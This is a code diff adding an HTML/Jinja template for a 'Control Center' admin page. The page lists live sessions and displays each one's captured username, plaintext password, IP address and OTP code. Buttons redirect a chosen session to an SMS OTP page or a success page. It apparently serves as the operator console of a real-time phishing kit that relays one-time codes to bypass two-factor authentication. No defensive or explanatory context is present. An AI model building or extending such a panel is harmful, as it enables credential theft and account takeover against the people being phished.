@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Center | Admin</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=JetBrains+Mono:wght@400;500&family=Barlow:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/admin.css') }}">
+</head>
+<body>
+
+<div class="shell">
+
+    <!-- ── TOPBAR ─────────────────────────────── -->
+    <header class="topbar">
+        <div class="topbar-logo">
+            <div class="logo-icon">
+                <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="1" y="1" width="5" height="5" rx="1" fill="#00d4ff"/>
+                    <rect x="8" y="1" width="5" height="5" rx="1" fill="#00d4ff" opacity="0.5"/>
+                    <rect x="1" y="8" width="5" height="5" rx="1" fill="#00d4ff" opacity="0.5"/>
+                    <rect x="8" y="8" width="5" height="5" rx="1" fill="#00d4ff"/>
+                </svg>
+            </div>
+            CTRL
+        </div>
+
+        <div class="topbar-spacer"></div>
+        <div class="clock" id="clock">--:--:--</div>
+        <div class="topbar-avatar">AD</div>
+    </header>
+
+    <!-- ── CONTENT ────────────────────────────── -->
+    <main class="content">
+
+        <!-- Stat bar -->
+        <div class="stat-bar">
+            <div class="stat-num">{{ sessions|length if sessions else '0' }}</div>
+            <div class="stat-info">
+                <div class="stat-label">Active Sessions</div>
+                <div class="stat-sub">live connections</div>
+            </div>
+            <div class="pulse-dot"></div>
+        </div>
+
+        <!-- Session list -->
+        <div class="table-card">
+            <div class="table-head">
+                <div class="table-title">Sessions</div>
+                <span class="count-pill">{{ sessions|length if sessions else '0' }} ACTIVE</span>
+                <button class="btn-refresh" onclick="location.reload()">
+                    <svg viewBox="0 0 13 13" fill="none">
+                        <path d="M11 2A6 6 0 102 9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M11 6V2H7" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Refresh
+                </button>
+            </div>
+
+            <div class="session-list">
+
+                {% for uid, data in sessions.items() %}
+                <div class="session-item">
+
+    <!-- only this row toggles -->
+    <div class="session-summary" onclick="toggle(this.closest('.session-item'))">
+      <div class="s-dot"></div>
+      <span class="s-code">{{ uid[:8] }}…{{ uid[-4:] }}</span>
+
+      <span class="s-badge {% if data.redirect_url %}badge-active{% else %}badge-waiting{% endif %}">
+        {{ "Redirected" if data.redirect_url else "Awaiting" }}
+      </span>
+
+      <span class="s-chevron">›</span>
+    </div>
+
+    <!-- drawer no longer toggles -->
+    <div class="session-drawer">
+      <div class="drawer-inner">
+        <div class="info-grid">
+
+          <div class="info-field">
+            <span class="info-key">Session ID</span>
+            <span class="info-val">{{ uid }}</span>
+          </div>
+
+          <div class="info-field">
+            <span class="info-key">Username</span>
+            <span class="info-val">{{ user if user else '—' }}</span>
+          </div>
+
+          <div class="info-field">
+            <span class="info-key">Password</span>
+            <span class="info-val">{{ pw if pw else '—' }}</span>
+          </div>
+
+          <div class="info-field">
+            <span class="info-key">IP Address</span>
+            <span class="info-val">{{ ip if ip else '—' }}</span>
+          </div>
+
+          <div class="info-field">
+            <span class="info-key">OTP Code</span>
+            <span class="info-val">{{ code if code else '—' }}</span>
+          </div>
+
+        </div>
+
+        <div class="drawer-actions">
+          <a href="/admin/redirect/{{ uid }}/number-verify" class="btn-action btn-sms">⊞ SMS OTP</a>
+          <a href="/admin/redirect/{{ uid }}/success" class="btn-action btn-success">✓ Success</a>
+        </div>
+      </div>
+    </div>
+
+  </div>
+                {% endfor %}
+
+                {% if not sessions %}
+                <div class="empty-state">
+                    <svg class="empty-icon" viewBox="0 0 48 48" fill="currentColor">
+                        <rect x="4" y="12" width="40" height="26" rx="4"/>
+                        <circle cx="24" cy="25" r="7"/>
+                        <path d="M16 38v4M32 38v4M12 42h24"/>
+                    </svg>
+                    <div class="empty-text">NO ACTIVE SESSIONS</div>
+                    <div class="empty-sub">Waiting for connections...</div>
+                </div>
+                {% endif %}
+
+            </div>
+        </div>
+
+    </main>
+</div>
+
+<script>
+    // Clock
+    function tick() {
+        document.getElementById('clock').textContent = new Date().toTimeString().slice(0, 8);
+    }
+    tick(); setInterval(tick, 1000);
+
+    // Toggle session drawer
+    function toggle(el) {
+        el.classList.toggle('open');
+    }
+</script>
+</body>
+</html>
